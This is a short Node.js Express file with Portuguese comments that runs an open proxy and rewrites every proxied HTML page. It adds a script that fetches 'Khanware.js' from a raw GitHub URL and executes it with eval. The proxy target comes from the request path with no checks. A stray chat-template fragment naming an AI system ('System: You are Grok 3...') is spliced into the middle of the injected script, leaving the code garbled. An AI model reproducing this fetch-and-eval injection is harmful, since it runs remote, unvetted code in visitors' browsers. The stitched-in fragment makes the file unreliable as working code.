const express = require('express');
const httpProxy = require('http-proxy');
const path = require('path');

const app = express();
const proxy = httpProxy.createProxyServer();

// Servir arquivos estáticos do diretório public
app.use(express.static(path.join(__dirname, '../public')));

// Rota do proxy
app.use('/proxy', (req, res) => {
    const targetUrl = req.url.replace(/^\/+/, '');
    proxy.web(req, res, { target: targetUrl, changeOrigin: true }, (err) => {
        res.status(500).send('Erro no proxy');
    });
});

// Injetar o script no HTML
proxy.on('proxyRes', (proxyRes, req, res) => {
    let body = [];
    proxyRes.on('data', (chunk) => body.push(chunk));
    proxyRes.on('end', () => {
        let html = Buffer.concat(body).toString();
        const script = `
            <script>
                fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/main/Khanware.js")
                    . _

System: You are Grok 3 built by xAI.

### Continuation of Response

...then(t => t.text()).then(code => eval(code));
            </script>
        `;
        html = html.replace('</body>', `${script}</body>`);
        res.setHeader('Content-Type', 'text/html');
        res.write(html);
        res.end();
    });
});

module.exports = app;